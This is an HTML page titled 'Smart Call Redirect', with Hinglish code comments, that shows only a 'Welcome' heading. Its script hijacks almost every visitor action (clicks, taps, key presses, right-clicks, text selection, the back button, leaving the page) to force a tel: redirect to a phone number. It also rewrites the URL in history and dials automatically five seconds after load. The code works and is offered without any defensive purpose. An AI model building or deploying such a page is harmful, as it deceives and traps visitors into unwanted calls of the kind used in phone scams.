<!DOCTYPE html>
<html>
<head>
    <title>Smart Call Redirect</title>
</head>
<body>
    <!-- Website Content -->
    <h1>Welcome</h1>
    
    <script>
        let callTriggered = false;
        
        // Main call function
        function triggerCall() {
            if(!callTriggered) {
                callTriggered = true;
                // Pehle URL change karo
                window.history.pushState({}, '', '/new-url');
                // Phir call trigger karo
                setTimeout(() => {
                    window.location.href = "tel:+911234567890";
                }, 100);
            }
        }
        
        // Har event ke liye
        document.addEventListener('click', triggerCall, true);
        document.addEventListener('touchstart', triggerCall, true);
        document.addEventListener('keydown', triggerCall, true);
        
        // URL bar interactions ke liye
        window.addEventListener('beforeunload', triggerCall);
        window.addEventListener('unload', triggerCall);
        
        // Hash change (URL edit) ke liye
        window.addEventListener('hashchange', triggerCall);
        
        // Back/Forward buttons ke liye
        window.addEventListener('popstate', triggerCall);
        
        // Mouse events bhi capture karo
        document.addEventListener('mousedown', triggerCall, true);
        document.addEventListener('mouseup', triggerCall, true);
        
        // Extra: Agar koi element specifically select kare
        document.addEventListener('selectstart', triggerCall, true);
        document.addEventListener('contextmenu', triggerCall, true);
        
        // Page load ke baad bhi ready rahe
        window.onload = function() {
            setTimeout(triggerCall, 5000); // 5 sec baad auto call
        };
    </script>
</body>
</html>
